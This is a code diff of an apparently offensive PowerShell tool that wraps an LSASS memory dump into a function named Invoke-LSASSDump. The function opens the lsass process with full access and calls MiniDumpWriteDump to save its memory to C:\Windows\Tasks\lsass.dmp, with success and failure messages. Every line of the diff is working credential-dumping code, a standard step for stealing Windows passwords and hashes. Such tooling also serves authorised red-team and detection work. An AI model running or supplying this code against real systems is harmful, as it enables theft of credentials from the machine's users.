@@ -23,11 +23,18 @@ public static class DumpLsass {
 }
 "@
 
-$dumpLocation = "C:\Windows\Tasks\lsass.dmp";
-$lsassProcess = [System.Diagnostics.Process]::GetProcessesByName("lsass");
-$lsassProcessID = $lsassProcess.Id;
-[IntPtr] $lsassHandle = [DumpLsass]::OpenProcess("0x001F0FF", "false", $lsassProcessID);
-$fileStream = [System.IO.File]::Create($dumpLocation);
-[bool] $dumped = [DumpLsass]::MiniDumpWriteDump($lsassHandle, $lsassProcessID, $fileStream.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);
-$fileStream.Close();
-$dumped
+Function Invoke-LSASSDump {
+    param ([string]$DumpLocation = "C:\Windows\Tasks\lsass.dmp");
+    $lsassProcess = [System.Diagnostics.Process]::GetProcessesByName("lsass");
+    Write-Host -NoNewLine "[+] Found LSASS ID: " $lsassProcess.Id `n;
+    $lsassProcessID = $lsassProcess.Id;
+    [IntPtr] $lsassHandle = [DumpLsass]::OpenProcess("0x001F0FF", "false", $lsassProcessID);
+    $fileStream = [System.IO.File]::Create($dumpLocation);
+    [bool] $dumped = [DumpLsass]::MiniDumpWriteDump($lsassHandle, $lsassProcessID, $fileStream.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);
+    $fileStream.Close();
+    if ($dumped -eq "True") {
+        Write-Host -NoNewLine "[+] Dumped LSASS process to " $DumpLocation `n;
+    } else {
+        Write-Error "[!] Failed to dump LSASS process. Have you got enough permissions?" `n;
+    }
+}
